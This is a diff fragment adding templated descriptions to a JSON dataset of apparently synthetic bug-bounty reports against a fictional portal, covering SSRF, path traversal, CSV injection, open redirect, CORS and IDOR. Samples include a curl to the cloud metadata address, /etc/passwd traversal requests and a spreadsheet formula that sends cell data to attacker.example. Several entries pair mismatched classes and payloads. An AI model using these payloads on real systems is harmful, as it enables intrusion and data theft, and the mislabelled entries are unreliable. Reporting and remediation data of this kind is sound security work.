+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9363,7 +9435,8 @@
           "offset": "7d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9490,7 +9563,8 @@
           "offset": "5d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9590,7 +9664,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9726,7 +9801,8 @@
           "offset": "1d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9838,7 +9914,8 @@
           "offset": "4d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9968,7 +10045,8 @@
           "offset": "1d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10102,7 +10180,8 @@
           "offset": "7d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10216,7 +10295,8 @@
           "offset": "18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10320,7 +10400,8 @@
           "offset": "3d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10439,7 +10520,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10542,7 +10624,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10658,7 +10741,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10826,7 +10910,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10953,7 +11038,8 @@
           "offset": "4d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11092,7 +11178,8 @@
           "offset": "3d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11230,7 +11317,8 @@
           "offset": "1d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11352,7 +11440,8 @@
           "offset": "4d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11535,7 +11624,8 @@
           "offset": "6d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11687,7 +11777,8 @@
           "offset": "2d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11825,7 +11916,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11929,7 +12021,8 @@
           "offset": "8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12061,7 +12154,8 @@
           "offset": "4d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12185,7 +12279,8 @@
           "offset": "1d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12304,7 +12399,8 @@
           "offset": "3d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12436,7 +12532,8 @@
           "offset": "4d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12532,7 +12629,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12680,7 +12778,8 @@
           "offset": "6d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12821,7 +12920,8 @@
           "offset": "1d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12927,7 +13027,8 @@
           "offset": "5d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13079,7 +13180,8 @@
           "offset": "5d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13247,7 +13349,8 @@
           "offset": "6d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
